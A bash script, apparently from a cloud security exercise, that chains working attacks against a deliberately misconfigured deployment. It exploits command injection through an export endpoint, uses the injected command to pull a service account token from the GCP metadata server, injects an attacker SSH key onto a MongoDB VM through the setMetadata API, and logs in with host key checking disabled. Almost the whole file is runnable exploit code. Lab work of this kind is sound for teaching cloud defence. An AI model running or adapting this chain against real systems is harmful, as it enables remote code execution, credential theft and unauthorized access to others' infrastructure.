#!/usr/bin/env bash
#
# Attack chain demo — exploits the intentional misconfigurations in this exercise.
#
# Prerequisites: curl, jq, ssh-keygen, ssh
# Usage: ./pwned.sh <LB_IP>
#
# Steps:
#   1. Command injection (RCE) in the app → shell in the GKE pod
#   2. Steal GCP metadata token from the pod (node's default Compute SA)
#   3. Inject SSH public key onto the MongoDB VM via setMetadata API
#   4. SSH into the MongoDB VM
#

set -euo pipefail

PROJECT="clgcporg10-171"
ZONE="us-central1-a"
VM="mongo-vm"
KEY_FILE="/tmp/attack_key_$$"

LB_IP="${1:-}"
if [[ -z "$LB_IP" ]]; then
  echo "Usage: $0 <LB_IP>"
  echo "  Get the LB IP with: kubectl get ingress bucket-list"
  exit 1
fi

cleanup() {
  rm -f "$KEY_FILE" "$KEY_FILE.pub"
}
trap cleanup EXIT

echo "=== Step 1: Command injection (RCE) ==="
echo "Exploiting /api/tasks/export?format=json;id ..."
RCE_OUTPUT=$(curl -s "http://${LB_IP}/api/tasks/export?format=json;id")
echo "$RCE_OUTPUT" | tail -1
echo

echo "=== Step 2: Steal GCP metadata token ==="
echo "Querying metadata server from inside the pod via RCE ..."
TOKEN_JSON=$(curl -s "http://${LB_IP}/api/tasks/export?format=json;wget+-qO-+--header=Metadata-Flavor:Google+http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token")
# Token JSON is after the tasks JSON line
TOKEN=$(echo "$TOKEN_JSON" | grep access_token | jq -r '.access_token')
if [[ -z "$TOKEN" || "$TOKEN" == "null" ]]; then
  echo "ERROR: Failed to extract token. Raw response:"
  echo "$TOKEN_JSON"
  exit 1
fi
echo "Got token: ${TOKEN:0:20}...${TOKEN: -20}"
echo

echo "=== Step 3: Inject SSH key onto MongoDB VM ==="
ssh-keygen -t rsa -f "$KEY_FILE" -N "" -q
PUBKEY=$(cat "$KEY_FILE.pub")
echo "Generated throwaway keypair"

echo "Fetching VM metadata fingerprint ..."
VM_META=$(curl -s -H "Authorization: Bearer ${TOKEN}" \
  "https://compute.googleapis.com/compute/v1/projects/${PROJECT}/zones/${ZONE}/instances/${VM}")
FINGERPRINT=$(echo "$VM_META" | jq -r '.metadata.fingerprint')
VM_IP=$(echo "$VM_META" | jq -r '.networkInterfaces[0].accessConfigs[0].natIP')
echo "VM external IP: ${VM_IP}"
echo "Metadata fingerprint: ${FINGERPRINT}"

echo "Calling setMetadata to inject SSH key ..."
SET_RESULT=$(curl -s -X POST \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  "https://compute.googleapis.com/compute/v1/projects/${PROJECT}/zones/${ZONE}/instances/${VM}/setMetadata" \
  -d "{
    \"fingerprint\": \"${FINGERPRINT}\",
    \"items\": [{
      \"key\": \"ssh-keys\",
      \"value\": \"attacker:${PUBKEY}\"
    }]
  }")
STATUS=$(echo "$SET_RESULT" | jq -r '.status // .error.message')
echo "API response: ${STATUS}"

if [[ "$STATUS" != "RUNNING" && "$STATUS" != "DONE" ]]; then
  echo "ERROR: setMetadata failed:"
  echo "$SET_RESULT" | jq .
  exit 1
fi

echo "Waiting for metadata to propagate ..."
sleep 5
echo

echo "=== Step 4: SSH into MongoDB VM ==="
echo "Connecting to attacker@${VM_IP} ..."
echo "  (type 'exit' to disconnect)"
echo
ssh -i "$KEY_FILE" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null attacker@"${VM_IP}"
